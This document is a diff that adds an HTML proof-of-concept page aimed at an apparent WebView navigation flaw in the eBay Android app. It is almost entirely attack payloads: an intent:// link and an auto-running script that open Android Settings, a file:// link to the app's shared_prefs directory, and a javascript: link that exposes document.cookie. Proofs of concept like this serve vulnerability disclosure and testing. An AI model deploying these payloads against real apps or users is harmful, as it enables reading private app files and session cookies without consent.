@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>eBay WebView Exploit POC</title>
+</head>
+<body>
+  <h1>eBay WebView Exploit Proof-of-Concept</h1>
+  
+  <p>This page attempts to exploit the eBay WebView vulnerability by navigating to malicious URLs without validation.</p>
+
+  <h2>Exploit 1: Open Android Settings</h2>
+  <p>Clicking the link below will attempt to open the Android Settings app:</p>
+  <a href="intent://settings/intent;scheme=android;action=android.settings.SETTINGS;end">Open Settings</a>
+
+  <h2>Exploit 2: Access Local Files</h2>
+  <p>Clicking the link below will attempt to access local app files:</p>
+  <a href="file:///data/data/com.ebay.mobile/shared_prefs/">Access Local Files</a>
+
+  <h2>Exploit 3: JavaScript Redirect</h2>
+  <p>The page will automatically attempt a JavaScript redirect on load:</p>
+  <script>
+    window.location='intent://settings/intent;scheme=android;action=android.settings.SETTINGS;end';
+  </script>
+
+  <h2>Exploit 4: JavaScript Alert</h2>
+  <p>Clicking the link below will attempt to execute JavaScript and display an alert with the document.cookie:</p>
+  <a href="javascript:alert(document.cookie)">Clic</a>
+</body>
+</html>
